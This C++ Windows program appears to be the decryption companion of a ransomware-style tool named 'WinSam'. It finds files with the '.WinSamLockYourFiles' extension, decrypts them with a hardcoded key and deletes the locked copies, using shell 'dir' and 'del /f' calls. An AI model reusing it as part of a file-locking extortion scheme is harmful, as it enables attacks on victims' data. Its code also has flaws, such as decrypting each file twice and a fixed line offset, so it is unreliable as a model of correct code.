#include <iostream>
#include <fstream>
#include <string>
#include "code/sys.h"
#include <Windows.h>
using namespace std;

int main()
{
	SetConsoleTitle("WinSam Stop the Cry . HoRaaryyy.... ");
	char * str = (char*)(L"记得回来加密噢确保你的私人物品是安全的");
	// Provide "str" to this third party source code
	// Once you get again "str", now you can:
	wchar_t * wstr = (wchar_t*)(str);
	//cout << *wstr << endl;
	MessageBoxW(NULL, wstr, (LPCWSTR)L"DECRYPTION ALERT BOX ", MB_OK);
	string data1, data2, key, mode, check;
	system("dir >efgrewdfrgt54redsw34rgthtrgfed45grtbthui87utrgdcsertghjmkuygtdsewrtghjmkiuty7tgfdsew4rthyjmiuygtfdcseawr4wt5ghju7rtgfd.txt");
			ifstream a;
			a.open("efgrewdfrgt54redsw34rgthtrgfed45grtbthui87utrgdcsertghjmkuygtdsewrtghjmkiuty7tgfdsew4rthyjmiuygtfdcseawr4wt5ghju7rtgfd.txt");
			int count=0;

			while (!a.eof())
			{ 
				string tempaaaa;
				getline(a, tempaaaa);
				count++;
			}
			a.close();
			count = count - 10; // minus the file that no revelant 
			int tempa = count;
			string *arrays = new string[tempa];
			ifstream b;
			b.open("efgrewdfrgt54redsw34rgthtrgfed45grtbthui87utrgdcsertghjmkuygtdsewrtghjmkiuty7tgfdsew4rthyjmiuygtfdcseawr4wt5ghju7rtgfd.txt");
			
			count = 0;
			while (!b.eof())
			{
				string temp1;
				string temp2;
				getline(b, temp1, '.');
				getline(b, temp2);
				if (temp2 == "." || temp2 == "")
				{

				}
				else
				{ 
					string s2 = ".WinSamLockYourFiles";
					if (temp2.find(s2) != std::string::npos)
					{
						temp2 = "." + temp2;
						for (int i = temp1.length() - 1; 0 < i; i--)
						{
							if (temp1[i] == 'M' && (temp1[i - 1] == 'A' || temp1[i - 1] == 'P') && (temp1[i - 2] == ' ' || temp1[i - 2] == 32) && temp1[i - 5] == ':' && temp1[i - 8] == 32 && temp1[i - 9] == 32)
							{
								break;
							}
							else
							{
								temp2 = temp1[i] + temp2;
							}
						}
						for (int i = 0; i < temp2.length(); i++)
						{
							if (temp2[i] == 32 || temp2[i] == ' ')
							{
								continue;
							}
							else
							{
								temp2 = temp2.substr(i, temp2.length() - i);
								break;
							}
						}
						for (int i = 0; i < temp2.length() - 1; i++)
						{
							if (temp2[i] == 32 || temp2[i] == ' ')
							{
								temp2 = temp2.substr(i + 1, temp2.length() - i);
								break;
							}
						}
						arrays[count] = temp2;
						//cout << "arrays " << count << "value is" << arrays[count] << endl;
						count++;
					}
					else
					{
						continue;
					}
				}
			}
			b.close();
			system("del /f efgrewdfrgt54redsw34rgthtrgfed45grtbthui87utrgdcsertghjmkuygtdsewrtghjmkiuty7tgfdsew4rthyjmiuygtfdcseawr4wt5ghju7rtgfd.txt");
			for (int i = 0; i < count; i++)
			{
				mode = "D";
				check = "mWtO1G7EhP4Ufohc1mSIZU7QGW7wjM^yqxlY$bAyBL77qmq@ZPbRaidE%nXyvASi6z5aHW4Fd6hoj1BmY8smNNWh3JHxP9PVE!U";
				key   = "mWtO1G7EhP4Ufohc1mSIZU7QGW7wjM^yqxlY$bAyBL77qmq@ZPbRaidE%nXyvASi6z5aHW4Fd6hoj1BmY8smNNWh3JHxP9PVE!U";
				data1=arrays[i];
				int temp = data1.length();
				string tempp = data1.substr(0, temp - 20);
				data2 = tempp;
				//data2 = data1 + ".WinSamLockYourFiles";
				readSystem(data1, data2, key, mode);
				thread tmain(readSystem, data1, data2, key, mode);
				tmain.join();
				if (remove(data1.c_str()) != 0)
				{
					cout << "Failed to remove the Encrypted Documents "<<arrays[i]<< endl;
					//perror("Error deleting file");
				}
				else
				{
					puts("File successfully deleted ^ is Decrypted ");
				}
			}	
			delete[]arrays;
			arrays = nullptr;
			system("pause");
			
	return 0;
}

